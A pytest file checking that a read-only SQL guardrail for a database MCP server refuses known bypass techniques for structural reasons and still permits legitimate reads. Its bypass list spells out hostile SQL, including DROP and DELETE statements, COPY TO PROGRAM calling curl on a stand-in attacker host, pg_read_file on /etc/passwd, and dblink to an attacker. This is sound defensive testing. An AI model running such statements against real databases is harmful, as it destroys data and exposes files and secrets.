"""Adversarial suite against the SQL guardrail.

Every case here is a documented technique for escaping a naive "read-only SQL"
filter. The point is not that the guardrail refuses them — it is that the
guardrail refuses them *for a structural reason* (AST node type, statement
count, resolved function name) rather than because a pattern happened to match.

A regex-based filter passes roughly a third of this file.

If any case in BYPASS_ATTEMPTS stops raising, CI fails. That is the contract.
"""

from __future__ import annotations

import pytest
from mcp_core.errors import GuardrailViolation
from rds_readonly_mcp.guardrails import (
    GuardrailConfig,
    enforce_result_caps,
    require_unmask_capability,
    validate_select,
)

# (label, sql, expected_control)
BYPASS_ATTEMPTS: list[tuple[str, str, str]] = [
    # --- Stacked statements: the classic. Any check that reads only the first
    #     statement is defeated here.
    ("stacked write", "SELECT 1; DROP TABLE orders", "single-statement"),
    ("stacked with comment", "SELECT 1; -- x\nDELETE FROM orders", "single-statement"),
    ("trailing semicolon write", "SELECT id FROM orders; UPDATE orders SET status='x'",
     "single-statement"),

    # --- CTE-wrapped writes: the statement genuinely *starts* with WITH/SELECT,
    #     so "must begin with SELECT" checks let these straight through.
    ("CTE insert",
     "WITH w AS (INSERT INTO orders (status) VALUES ('x') RETURNING id) SELECT * FROM w",
     "read-only"),
    ("CTE update",
     "WITH w AS (UPDATE orders SET status='x' RETURNING id) SELECT * FROM w",
     "read-only"),
    ("CTE delete",
     "WITH w AS (DELETE FROM orders RETURNING id) SELECT * FROM w",
     "read-only"),

    # --- Direct mutations.
    ("plain insert", "INSERT INTO orders (status) VALUES ('x')", "read-only"),
    ("plain update", "UPDATE orders SET status='x'", "read-only"),
    ("plain delete", "DELETE FROM orders", "read-only"),
    ("truncate", "TRUNCATE orders", "read-only"),
    ("drop", "DROP TABLE orders", "read-only"),
    ("create", "CREATE TABLE evil (id int)", "read-only"),
    ("alter", "ALTER TABLE orders ADD COLUMN evil text", "read-only"),
    ("grant", "GRANT SELECT ON orders TO PUBLIC", "read-only"),
    ("merge", "MERGE INTO orders USING products ON true WHEN MATCHED THEN DELETE", "read-only"),

    # --- SELECT INTO silently creates a table; it is a write wearing a read's
    #     syntax.
    ("select into", "SELECT * INTO evil FROM orders", "read-only"),

    # --- Security-context changes.
    ("set role", "SET ROLE postgres", "read-only"),
    ("set search_path", "SET search_path TO public", "read-only"),

    # --- Command execution / filesystem reach.
    ("copy to program", "COPY (SELECT 1) TO PROGRAM 'curl attacker.example.com'", "read-only"),
    ("copy from file", "COPY orders FROM '/etc/passwd'", "read-only"),
    ("pg_read_file", "SELECT pg_read_file('/etc/passwd')", "function-denylist"),
    # Schema qualification must not smuggle a denied function past a bare-name
    # comparison.
    ("schema-qualified pg_read_file",
     "SELECT pg_catalog.pg_read_file('/etc/passwd')", "function-denylist"),
    ("pg_ls_dir", "SELECT pg_ls_dir('/')", "function-denylist"),
    ("lo_import", "SELECT lo_import('/etc/passwd')", "function-denylist"),
    ("dblink", "SELECT dblink('host=attacker', 'SELECT 1')", "function-denylist"),
    ("pg_sleep DoS", "SELECT pg_sleep(60)", "function-denylist"),
    ("current_setting probe", "SELECT current_setting('pharmacy.mask_salt')",
     "function-denylist"),
    # Nesting a denied function inside a legitimate query must not hide it.
    ("nested denied function",
     "SELECT id FROM orders WHERE status = pg_read_file('/etc/passwd')",
     "function-denylist"),

    # --- Locking: a read that blocks writers is an availability problem.
    ("for update", "SELECT * FROM orders FOR UPDATE", "no-locking"),

    # --- Relation allowlist: the base tables holding raw PII.
    ("raw customers", "SELECT * FROM customers", "relation-allowlist"),
    ("raw prescriptions", "SELECT * FROM prescriptions", "relation-allowlist"),
    ("system catalog", "SELECT * FROM pg_authid", "relation-allowlist"),
    # Hiding the denied relation inside a UNION or subquery must not work.
    ("union with denied relation",
     "SELECT id FROM orders UNION SELECT id FROM customers", "relation-allowlist"),
    ("subquery with denied relation",
     "SELECT id FROM orders WHERE customer_id IN (SELECT id FROM customers)",
     "relation-allowlist"),

    # --- Malformed / obfuscated input is refused, never "executed to see".
    ("comment-split keyword", "SEL/**/ECT 1", "sql-parse"),
    ("empty", "", "sql-parse"),
    ("whitespace only", "   \n\t ", "sql-parse"),
]


@pytest.mark.parametrize(
    ("label", "sql", "control"),
    BYPASS_ATTEMPTS,
    ids=[label for label, _, _ in BYPASS_ATTEMPTS],
)
def test_bypass_attempt_is_refused(label: str, sql: str, control: str) -> None:
    with pytest.raises(GuardrailViolation) as exc:
        validate_select(sql)
    # Assert on the *control*, not just that something raised: a refusal for
    # the wrong reason is a latent bypass waiting for a schema change.
    assert exc.value.control == control, (
        f"{label!r} was refused by {exc.value.control!r}, expected {control!r}"
    )


# --- Statements that MUST be permitted -------------------------------------
# A guardrail that refuses everything is trivially "secure" and useless. These
# pin the other edge.

ALLOWED = [
    ("simple select", "SELECT id, status FROM orders"),
    ("join across allowed relations",
     "SELECT o.id, p.name FROM orders o JOIN order_items i ON i.order_id = o.id "
     "JOIN products p ON p.id = i.product_id"),
    ("masked customer view", "SELECT given_name, city FROM v_customers_masked"),
    ("masked prescription view", "SELECT medication FROM v_prescriptions_masked"),
    ("aggregate", "SELECT status, count(*) FROM orders GROUP BY status"),
    ("CTE that is genuinely read-only",
     "WITH recent AS (SELECT * FROM orders) SELECT count(*) FROM recent"),
    ("union of allowed relations",
     "SELECT id FROM orders UNION SELECT id FROM products"),
]


@pytest.mark.parametrize(("label", "sql"), ALLOWED, ids=[label for label, _ in ALLOWED])
def test_legitimate_reads_are_permitted(label: str, sql: str) -> None:
    out = validate_select(sql)
    assert "LIMIT" in out.upper()


def test_cte_alias_is_not_treated_as_a_relation() -> None:
    """Regression guard: naive allowlisting refuses every legitimate CTE."""
    out = validate_select("WITH recent AS (SELECT * FROM orders) SELECT * FROM recent")
    assert "recent" in out.lower()


# --- LIMIT enforcement -----------------------------------------------------


def test_limit_is_injected_when_absent() -> None:
    assert "LIMIT 500" in validate_select("SELECT * FROM orders").upper()


def test_oversized_caller_limit_is_lowered_not_honoured() -> None:
    out = validate_select("SELECT * FROM orders LIMIT 100000").upper()
    assert "LIMIT 500" in out
    assert "100000" not in out


def test_smaller_caller_limit_is_respected() -> None:
    assert "LIMIT 10" in validate_select("SELECT * FROM orders LIMIT 10").upper()


def test_non_literal_limit_is_replaced() -> None:
    """We cannot reason about what an expression LIMIT evaluates to."""
    out = validate_select("SELECT * FROM orders LIMIT (SELECT 99999)").upper()
    assert "LIMIT 500" in out


# --- Result caps -----------------------------------------------------------


def test_row_cap_enforced_on_actual_results() -> None:
    with pytest.raises(GuardrailViolation) as exc:
        enforce_result_caps([{"a": 1}] * 501, 10)
    assert exc.value.control == "row-cap"


def test_byte_cap_catches_wide_rows() -> None:
    """LIMIT bounds row count, not row size — 10 rows can still be 10 MB."""
    with pytest.raises(GuardrailViolation) as exc:
        enforce_result_caps([{"a": 1}] * 10, 999_999_999)
    assert exc.value.control == "byte-cap"


# --- Unmask capability -----------------------------------------------------


def test_unmask_refused_by_default() -> None:
    with pytest.raises(GuardrailViolation) as exc:
        require_unmask_capability()
    assert exc.value.control == "unmask-capability"


def test_unmask_allowed_only_when_deployment_opts_in() -> None:
    require_unmask_capability(GuardrailConfig(allow_unmask=True))


def test_refusal_message_names_the_control() -> None:
    """The model must be able to read *why* and change approach."""
    with pytest.raises(GuardrailViolation) as exc:
        validate_select("DELETE FROM orders")
    assert "read-only" in exc.value.public_message
